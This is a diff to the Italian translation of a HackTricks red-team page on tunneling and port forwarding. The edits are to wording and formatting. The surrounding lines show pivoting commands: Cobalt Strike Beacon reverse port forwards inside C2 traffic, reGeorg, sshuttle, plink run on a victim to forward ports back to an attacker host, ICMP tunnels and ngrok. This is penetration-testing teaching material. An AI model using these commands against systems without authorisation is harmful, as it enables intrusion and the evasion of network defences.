@@ -1,24 +1,24 @@
-# Tunneling and Port Forwarding
+# Tunneling e Port Forwarding
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica il Hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il Hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Supporta HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
 {% endhint %}
 
-## Nmap tip
+## Suggerimento Nmap
 
 {% hint style="warning" %}
-**ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **scansioni TCP** (`-sT`) affinché questo funzioni.
+**ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **scans TCP** (`-sT`) affinché questo funzioni.
 {% endhint %}
 
 ## **Bash**
@@ -103,7 +103,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Puoi **tunnel** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
+Puoi **tunneling** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
 Ad esempio, inoltrando tutto il traffico che va a 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -167,14 +167,14 @@ rportfwd stop [bind port]
 ```
 To note:
 
-- Il reverse port forward di Beacon è progettato per **tunneling del traffico verso il Team Server, non per il relay tra macchine individuali**.
-- Il traffico è **tunneled all'interno del traffico C2 di Beacon**, inclusi i link P2P.
-- **I privilegi di amministratore non sono richiesti** per creare reverse port forwards su porte alte.
+* Il reverse port forward di Beacon è progettato per **tunneling del traffico verso il Team Server, non per il relay tra macchine individuali**.
+* Il traffico è **tunneled all'interno del traffico C2 di Beacon**, inclusi i link P2P.
+* **I privilegi di amministratore non sono richiesti** per creare reverse port forwards su porte alte.
 
 ### rPort2Port locale
 
 {% hint style="warning" %}
-In questo caso, la **porta è aperta nell'host beacon**, non nel Team Server e il **traffico è inviato al client Cobalt Strike** (non al Team Server) e da lì all'host:porta indicato.
+In questo caso, il **port è aperto nell'host beacon**, non nel Team Server e il **traffico è inviato al client Cobalt Strike** (non al Team Server) e da lì all'host:port indicato.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -191,7 +191,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ## Chisel
 
 Puoi scaricarlo dalla pagina delle release di [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
-Devi utilizzare **la stessa versione per client e server**
+Devi utilizzare la **stessa versione per client e server**
 
 ### socks
 ```bash
@@ -332,7 +332,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 È come una versione console di PuTTY (le opzioni sono molto simili a quelle di un client ssh).
 
-Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una connessione inversa. Quindi, per inoltrare solo una porta accessibile localmente a una porta nella nostra macchina:
+Poiché questo binario verrà eseguito nella vittima ed è un client ssh, dobbiamo aprire il nostro servizio ssh e la porta in modo da poter avere una connessione inversa. Quindi, per inoltrare solo la porta accessibile localmente a una porta nella nostra macchina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -356,10 +356,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 È necessario avere **accesso RDP sul sistema**.\
 Scarica:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzionalità Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti sulla connessione RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Questo strumento utilizza `Dynamic Virtual Channels` (`DVC`) dalla funzione Remote Desktop Service di Windows. DVC è responsabile per **il tunneling dei pacchetti sulla connessione RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-Nel computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
+Nel tuo computer client carica **`SocksOverRDP-Plugin.dll`** in questo modo:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
@@ -465,7 +465,7 @@ Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la rich
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-È necessario avere i permessi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
+È necessario l'accesso root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -489,13 +489,13 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/) è uno strumento per esporre soluzioni a Internet con un'unica riga di comando.**
-*Le URI di esposizione sono come:* **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **è uno strumento per esporre soluzioni a Internet con un'unica riga di comando.**\
+&#xNAN;_&#x45;xposition URI sono come:_ **UID.ngrok.io**
 
 ### Installazione
 
-- Crea un account: https://ngrok.com/signup
-- Download del client:
+* Crea un account: https://ngrok.com/signup
+* Download del client:
 ```bash
 tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
 chmod a+x ./ngrok
@@ -506,7 +506,7 @@ chmod a+x ./ngrok
 
 **Documentazione:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*È anche possibile aggiungere autenticazione e TLS, se necessario.*
+_È anche possibile aggiungere autenticazione e TLS, se necessario._
 
 #### Tunneling TCP
 ```bash
@@ -523,7 +523,7 @@ chmod a+x ./ngrok
 ```
 #### Sniffing HTTP calls
 
-*Utile per XSS, SSRF, SSTI ...*
+_Utile per XSS, SSRF, SSTI ..._\
 Direttamente da stdout o nell'interfaccia HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
@@ -536,8 +536,9 @@ Direttamente da stdout o nell'interfaccia HTTP [http://127.0.0.1:4040](http://12
 #### ngrok.yaml esempio di configurazione semplice
 
 Apre 3 tunnel:
-- 2 TCP
-- 1 HTTP con esposizione di file statici da /tmp/httpbin/
+
+* 2 TCP
+* 1 HTTP con esposizione di file statici da /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
@@ -556,15 +557,15 @@ addr: file:///tmp/httpbin/
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
 
 {% hint style="success" %}
-Impara e pratica il hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica il hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica il hacking AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il hacking GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Supporta HackTricks</summary>
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
